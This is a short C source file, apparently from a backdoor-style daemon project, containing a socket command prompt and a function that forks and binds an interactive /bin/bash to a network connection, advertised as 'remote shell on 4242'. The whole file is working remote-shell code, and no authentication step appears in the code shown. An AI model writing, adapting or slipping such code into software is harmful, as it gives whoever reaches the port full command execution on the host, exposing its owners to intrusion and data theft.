#include "shell.h"

void	little_shell(int fd, t_server *server)
{
	char buffer[4096];
	int	ret;

	while (1)
	{
		write(fd, "$ ", sizeof("$ "));
		ret = read(fd, buffer, sizeof(buffer));
		if (ret <= 0)
			return ;
		buffer[ret - 1] = '\0';
		if (strncmp(buffer, "help", 4) == 0)
		{
			write(fd, "shell Spawn remote shell on 4242\n", sizeof("shell Spawn remote shell on 4242\n"));
			continue ;
		}
		else if (strncmp(buffer, "shell", 5) == 0)
		{
			write(fd, "Spawning shell on port 4242\n", sizeof("Spawning shell on port 4242\n"));
			server->request_shell[fd] = true;
			close(fd);
			return ;
		}
		else
		{
			write(fd, "command not found. type help\n", sizeof("command not found. type help\n"));
			continue ;
		}
	}
}

void shell(int fd, t_server *server)
{
	pid_t parent_pid;
	pid_t child_pid;

	parent_pid = getpid();
	child_pid = fork();
	if (child_pid == 0)
	{
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		chdir("/");
		execl("/bin/bash", "bash", "-i", NULL);
	}
	else
	{
		waitpid(child_pid, NULL, 0);
		server->request_shell[fd] = false;
		epoll_ctl(server->epollfd, EPOLL_CTL_DEL, fd, NULL);
		close(fd);
	}
}